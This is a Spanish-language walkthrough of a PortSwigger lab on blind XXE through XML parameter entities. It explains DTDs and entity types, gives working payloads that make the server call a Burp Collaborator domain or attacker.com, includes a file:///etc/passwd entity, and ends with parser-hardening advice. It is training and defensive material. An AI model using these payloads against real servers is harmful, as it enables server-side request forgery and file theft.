# PortSwigger Web Security Academy — XXE Lab 4

## Blind XXE with out-of-band interaction via XML parameter entities

**URL del lab:** `https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities`

## 1. Enunciado del laboratorio

El laboratorio tiene una funcionalidad de **Check stock** que recibe y analiza datos en formato XML. La diferencia con otros labs de XXE es que esta vez la aplicación:

1. Parsea XML.
2. No refleja valores inesperados en la respuesta.
3. Bloquea entidades externas normales.
4. Sigue siendo vulnerable mediante **XML parameter entities**.

Para resolverlo hay que provocar que el parser XML haga una interacción fuera de banda con Burp Collaborator. Es decir, queremos ver en Collaborator una consulta DNS y una petición HTTP originadas desde el servidor vulnerable.

La condición de resolución no es leer `/etc/passwd`, ni obtener una respuesta útil en la web. La condición de resolución es conseguir que el servidor contacte con un dominio de Burp Collaborator.

---

## 2. Qué significa Blind XXE

En un XXE clásico, el servidor procesa una entidad externa y luego devuelve su contenido en la respuesta.

Por ejemplo:

```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Si la aplicación refleja el valor de `productId`, podríamos ver algo como:

```text
Invalid product ID: root:x:0:0:root:/root:/bin/bash
```

Eso sería XXE visible, no blind.

En cambio, en este lab la aplicación no muestra el resultado de la entidad. La respuesta puede ser genérica:

```text
XML parsing error
```

o:

```text
Invalid product ID
```

Eso no significa que no haya vulnerabilidad. Significa que no podemos observar el resultado directamente por la respuesta HTTP principal.

Por eso usamos una técnica **out-of-band**.

---

## 3. Qué significa Out-of-Band

Out-of-band significa que la evidencia de la vulnerabilidad llega por otro canal distinto al canal normal petición-respuesta.

Canal normal:

```text
Tú → servidor → respuesta HTTP visible
```

Canal out-of-band:

```text
Tú → servidor vulnerable
          ↓
          servidor vulnerable → Burp Collaborator
```

Nosotros no necesitamos que la aplicación nos devuelva el contenido. Solo necesitamos comprobar que el servidor intentó contactar con nuestro dominio.

Burp Collaborator sirve justo para esto. Nos da un dominio único y registra si algún sistema realiza:

- DNS lookup.
- HTTP request.
- SMTP interaction.
- Otros tipos de callback.

En este lab buscamos DNS y HTTP.

---

## 4. Qué cambia respecto al lab anterior

En el lab anterior de Blind XXE se podía usar una entidad externa normal:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://dominio-collaborator.oastify.com">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Aquí el lab indica que las entidades externas normales están bloqueadas.

Eso significa que una payload de este estilo puede no generar ninguna interacción:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://dominio-collaborator.oastify.com">
]>
```

Y aunque añadieras `&xxe;`, el parser o la aplicación pueden bloquear esa entidad general externa.

La solución es usar **parameter entities**.

---

## 5. Entidades generales vs entidades parámetro

XML tiene varios tipos de entidades. Para este lab importan dos.

### 5.1 Entidad general

Se define así:

```xml
<!ENTITY xxe SYSTEM "http://attacker.com">
```

Y se usa así dentro del XML normal:

```xml
&xxe;
```

Ejemplo:

```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://attacker.com">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

La entidad general se expande en el cuerpo del documento XML.

### 5.2 Entidad parámetro

Se define así:

```xml
<!ENTITY % xxe SYSTEM "http://attacker.com">
```

Y se usa así dentro del DTD:

```xml
%xxe;
```

Ejemplo:

```xml
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "http://attacker.com">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

La diferencia visual es pequeña, pero técnicamente es enorme:

- General entity: `&xxe;`
- Parameter entity: `%xxe;`

La entidad parámetro se expande durante el procesamiento del DTD, no dentro del contenido normal del XML.

---

## 6. Qué es una DTD

DTD significa **Document Type Definition**.

Es una parte del estándar XML que sirve para definir reglas del documento:

- Qué elementos existen.
- Qué estructura debe tener el XML.
- Qué atributos existen.
- Qué entidades se pueden usar.
- Qué entidades externas debe resolver el parser.

Ejemplo simple:

```xml
<?xml version="1.0"?>
<!DOCTYPE persona [
  <!ELEMENT persona (nombre)>
  <!ELEMENT nombre (#PCDATA)>
]>
<persona>
  <nombre>Santi</nombre>
</persona>
```

En seguridad, la parte peligrosa de la DTD es que puede definir entidades externas:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

O entidades parámetro externas:

```xml
<!ENTITY % xxe SYSTEM "http://attacker.com">
%xxe;
```

El parser XML interpreta el DTD antes de terminar de procesar el documento XML. Por eso, si la DTD permite recursos externos, el parser puede hacer conexiones salientes.

---

## 7. Por qué las parameter entities sirven como bypass

Muchos filtros anti-XXE se implementan mal. Por ejemplo, pueden bloquear patrones típicos como:

```text
<!ENTITY xxe
&xxe;
file://
```

Pero pueden olvidarse de este formato:

```xml
<!ENTITY % xxe SYSTEM "http://attacker.com">
%xxe;
```

La aplicación puede bloquear entidades generales externas, pero dejar pasar entidades parámetro.

Ese es el fallo del lab.

El parser XML sigue siendo capaz de resolver recursos externos. Lo único que cambia es el mecanismo que usamos para activar la resolución.

---

## 8. Petición original del laboratorio

Al entrar en un producto y pulsar **Check stock**, capturamos esta petición:

```http
POST /product/stock HTTP/2
Host: 0a280087035e098e80ca26f800550082.web-security-academy.net
Cookie: session=QlcW36tr1GwHODoAmulw2TxjDyi5uHhC
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a280087035e098e80ca26f800550082.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0a280087035e098e80ca26f800550082.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

La clave es esta cabecera:

```http
Content-Type: application/xml
```

Eso nos dice que el servidor espera XML y lo parsea.

El cuerpo XML original es:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

La aplicación espera un `productId` y un `storeId` numéricos.

---

## 9. Payload correcta del lab

Copiamos un dominio de Burp Collaborator. Por ejemplo:

```text
fl4gh19u72k4lfg30tj5op6klbr2fs3h.oastify.com
```

Modificamos el XML así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "http://fl4gh19u72k4lfg30tj5op6klbr2fs3h.oastify.com">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

En una sola línea también puede verse así:

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://fl4gh19u72k4lfg30tj5op6klbr2fs3h.oastify.com"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

---

## 10. Desglose de la payload

### 10.1 Declaración XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

Indica que el documento es XML versión 1.0 y usa codificación UTF-8.

### 10.2 DOCTYPE

```xml
<!DOCTYPE stockCheck [ ... ]>
```

Introduce una DTD interna para el documento `stockCheck`.

### 10.3 Definición de parameter entity

```xml
<!ENTITY % xxe SYSTEM "http://fl4gh19u72k4lfg30tj5op6klbr2fs3h.oastify.com">
```

Esto define una entidad parámetro llamada `xxe`.

El `%` antes del nombre indica que no es una entidad general, sino una entidad parámetro.

`SYSTEM` indica que el contenido de la entidad se obtiene desde un recurso externo.

El recurso externo es:

```text
http://fl4gh19u72k4lfg30tj5op6klbr2fs3h.oastify.com
```

### 10.4 Expansión de la entidad parámetro

```xml
%xxe;
```

Esto fuerza al parser a expandir la entidad parámetro dentro del DTD.

Al expandirla, el parser intenta cargar el recurso externo.

Eso provoca:

1. Consulta DNS al dominio de Collaborator.
2. Petición HTTP al dominio de Collaborator.

### 10.5 XML normal

```xml
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Dejamos los valores normales porque el objetivo no es inyectar el resultado en `productId`. El objetivo es provocar la conexión externa durante el procesamiento del DTD.

---

## 11. Respuesta de la aplicación

Al enviar la payload, la aplicación responde:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 19

"XML parsing error"
```

Esto puede parecer un fallo, pero no lo es.

En este lab la respuesta esperada puede ser un error de parsing. Lo importante no es la respuesta de la web. Lo importante es lo que ocurre en Burp Collaborator.

---

## 12. Qué se observa en Burp Collaborator

Al hacer **Poll now**, aparecen interacciones:

- 2 DNS.
- 1 HTTP.

La interacción HTTP tiene este aspecto:

```http
GET / HTTP/1.1
User-Agent: Java/21.0.1
Host: fl4gh19u72k4lfg30tj5op6klbr2fs3h.oastify.com
Accept: */*
Connection: keep-alive
```

Eso es la prueba de que el servidor vulnerable ha hecho una petición hacia nuestro dominio.

---

## 13. Qué significa cada interacción

### 13.1 DNS

Antes de hacer una petición HTTP, el servidor necesita resolver el dominio:

```text
fl4gh19u72k4lfg30tj5op6klbr2fs3h.oastify.com
```

Para eso pregunta al DNS qué IP corresponde a ese nombre.

Burp Collaborator registra esa consulta.

Ver DNS significa:

```text
El servidor intentó resolver mi dominio.
```

Eso ya es una señal fuerte de XXE OOB.

### 13.2 HTTP

Después del DNS, el servidor hace una petición HTTP real:

```http
GET / HTTP/1.1
Host: fl4gh19u72k4lfg30tj5op6klbr2fs3h.oastify.com
```

Ver HTTP significa:

```text
El servidor no solo resolvió el dominio, también conectó por HTTP.
```

Eso confirma que la entidad externa se procesó completamente.

### 13.3 Por qué hay dos DNS

Es normal ver más de una consulta DNS. Puede ocurrir por:

- Resolución IPv4 e IPv6.
- Reintentos.
- Distintas capas de resolución.
- Comportamiento del runtime Java.
- Cachés internas.

No es un problema. Lo importante es que hay interacción.

---

## 14. Qué indica User-Agent: Java/21.0.1

La petición HTTP recibida por Collaborator incluye:

```http
User-Agent: Java/21.0.1
```

Esto sugiere que el backend probablemente usa Java para hacer la resolución de la entidad externa.

Podría estar usando parsers XML como:

- SAXParser.
- DOMParser.
- DocumentBuilderFactory.
- Xerces.
- APIs XML estándar de Java.

No necesitamos saber exactamente cuál. Pero el User-Agent revela que la petición salió de una librería Java, no de un navegador normal.

---

## 15. Por qué el lab se resuelve aunque la web diga XML parsing error

Porque la condición de resolución del laboratorio no es obtener una respuesta XML válida.

La condición es:

```text
Usar una entidad parámetro para hacer que el parser XML realice una consulta DNS y una petición HTTP a Burp Collaborator.
```

Y eso ocurrió.

El error de parsing es normal porque el contenido que devuelve Collaborator no necesariamente es una DTD válida para continuar el procesamiento.

El flujo fue:

1. El servidor recibió el XML.
2. El parser entró en el `DOCTYPE`.
3. El parser encontró la parameter entity `%xxe`.
4. El parser intentó cargarla desde OAST.
5. Se produjo DNS.
6. Se produjo HTTP.
7. La carga externa no encajó como DTD válida.
8. El parser lanzó error.
9. La aplicación devolvió `XML parsing error`.
10. El laboratorio se resolvió porque la interacción OOB ya había ocurrido.

---

## 16. Por qué una entidad normal no funcionaba

Probaste una payload de este estilo:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://o7w52bniza61a6ivz6rrx0h5iwoncd02.oastify.com">
]>
```

Con esa payload no se observó nada en Collaborator.

Hay dos razones importantes.

### 16.1 Solo defines la entidad, pero no la usas

Esto:

```xml
<!ENTITY xxe SYSTEM "http://attacker.com">
```

solo define la entidad.

Para que una entidad general se expanda, normalmente tienes que usarla:

```xml
&xxe;
```

Por ejemplo:

```xml
<productId>&xxe;</productId>
```

Si solo la defines y nunca la expandes, el parser puede no resolverla.

### 16.2 El lab bloquea entidades externas normales

Aunque usaras:

```xml
<productId>&xxe;</productId>
```

este laboratorio está diseñado para bloquear entidades externas generales.

Por eso la vía correcta es:

```xml
<!ENTITY % xxe SYSTEM "http://attacker.com">
%xxe;
```

La entidad parámetro se expande dentro de la DTD durante el procesamiento del `DOCTYPE`.

---

## 17. Diferencia mental clave

Entidad general:

```xml
<!ENTITY xxe SYSTEM "http://attacker.com">
```

Se usa así:

```xml
&xxe;
```

Se expande en el contenido XML.

Entidad parámetro:

```xml
<!ENTITY % xxe SYSTEM "http://attacker.com">
```

Se usa así:

```xml
%xxe;
```

Se expande dentro del DTD.

Esta diferencia es exactamente lo que permite el bypass.

---

## 18. Flujo completo del ataque

```text
1. Capturamos POST /product/stock.
2. Confirmamos que el body es XML.
3. Generamos un dominio en Burp Collaborator.
4. Insertamos un DOCTYPE con una parameter entity externa.
5. Forzamos su expansión con %xxe;.
6. Enviamos la petición.
7. La aplicación responde XML parsing error.
8. Hacemos Poll now en Collaborator.
9. Vemos DNS + HTTP.
10. El lab queda resuelto.
```

Visualmente:

```text
Tú
 ↓
POST /product/stock con XML malicioso
 ↓
Servidor vulnerable
 ↓
Parser XML procesa DOCTYPE
 ↓
%xxe; fuerza carga externa
 ↓
DNS lookup a oastify.com
 ↓
HTTP GET a oastify.com
 ↓
Burp Collaborator registra interacción
 ↓
Lab resuelto
```

---

## 19. Qué demuestra técnicamente este lab

Demuestra que:

1. La aplicación parsea XML controlado por el usuario.
2. El parser procesa DTDs.
3. Las entidades externas generales están bloqueadas o filtradas.
4. Las entidades parámetro siguen funcionando.
5. El servidor puede hacer consultas DNS externas.
6. El servidor puede hacer peticiones HTTP externas.
7. La vulnerabilidad es blind, porque la respuesta principal no muestra datos útiles.
8. Burp Collaborator permite confirmar la vulnerabilidad mediante OOB.

---

## 20. Impacto real

Aunque este lab solo pide detectar interacción OOB, en escenarios reales este tipo de fallo puede llevar a impactos más graves:

- Confirmación de XXE blind.
- SSRF mediante XML parser.
- Descubrimiento de red interna.
- Interacciones con servicios internos.
- Exfiltración de datos mediante DTD externa maliciosa.
- Lectura de archivos si se combina con técnicas de exfiltración OOB.

La gravedad depende de:

- Qué parser XML se use.
- Qué features estén habilitadas.
- Si se permiten DTDs externas.
- Si hay salida DNS/HTTP.
- Qué recursos internos puede alcanzar el servidor.

---

## 21. Prevención

La defensa correcta no es filtrar strings concretas como `xxe`, `ENTITY`, `SYSTEM` o `file://`.

Eso suele fallar porque XML tiene muchas formas de activar comportamientos similares.

La defensa correcta es configurar el parser XML de forma segura.

Medidas típicas:

1. Deshabilitar DTDs.
2. Deshabilitar entidades externas.
3. Deshabilitar parameter entities externas.
4. Usar parsers seguros por defecto.
5. No procesar XML innecesariamente.
6. Usar formatos más simples como JSON si no se necesitan características de XML.
7. Bloquear salida de red innecesaria desde servidores de aplicación.
8. Aplicar egress filtering.

En Java, por ejemplo, suelen aplicarse features de seguridad en `DocumentBuilderFactory`, `SAXParserFactory` o librerías equivalentes.

La idea es clara:

```text
No intentes reconocer payloads XXE.
Desactiva la funcionalidad peligrosa del parser.
```

---

## 22. Resumen final

Este lab no se resuelve leyendo archivos ni viendo datos sensibles en la respuesta HTTP.

Se resuelve provocando que el parser XML contacte con Burp Collaborator mediante una entidad parámetro.

La payload clave es:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "http://DOMINIO-COLLABORATOR">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

La respuesta web puede ser:

```text
XML parsing error
```

Pero Collaborator muestra:

```text
DNS interaction
HTTP interaction
```

Eso confirma la vulnerabilidad.

La frase clave del laboratorio es:

```text
Cuando las entidades externas normales están bloqueadas, las entidades parámetro pueden seguir forzando al parser a cargar recursos externos durante el procesamiento del DTD.
```

